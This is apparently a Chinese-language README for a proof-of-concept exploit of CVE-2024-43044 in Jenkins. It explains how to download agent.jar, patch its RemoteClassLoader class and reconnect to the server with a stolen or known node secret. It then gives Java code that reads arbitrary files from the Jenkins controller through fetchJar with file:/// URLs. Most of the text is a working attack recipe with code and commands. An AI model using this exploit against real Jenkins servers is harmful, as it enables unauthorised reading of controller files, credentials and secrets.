# 用法

通过`http://ip:port/jnlpJars/agent.jar`下载jar包

修改`\hudson\remoting\RemoteClassLoader.class`对应代码

![](https://raw.githubusercontent.com/v9d0g/CVE-2024-43044-POC/main/CVE-2024-43044/images/Pasted%20image%2020240813152523.png)

重新编译打包

需提前获悉node的密钥和名称
![](https://raw.githubusercontent.com/v9d0g/CVE-2024-43044-POC/main/CVE-2024-43044/images/Pasted%20image%2020240813152737.png)

```sh
java -jar agent.jar -url http://ip:port/ -secret <xxx> -name <xxx>
```

添加内容为：
```java
import java.util.Scanner;

try {  
    Scanner scanner = new Scanner(System.in);  
    System.out.print("输入读取文件path:");  
    String inputText = scanner.nextLine();  
    System.out.println("尝试读取:" + inputText);  
    URL jarFileUrl = new URL("file:///" + inputText);  
    byte[] fileContent = this.proxy.fetchJar(jarFileUrl);  
    String contentAsString = new String(fileContent, StandardCharsets.UTF_8);  
    System.out.println("文件内容:\n" + contentAsString);  
} catch (Exception var10) {  
    System.out.println("WRONG:" + var10);  
}
```

![](https://raw.githubusercontent.com/v9d0g/CVE-2024-43044-POC/main/CVE-2024-43044/images/c86ff215c67be979327f82a64485d30d.png)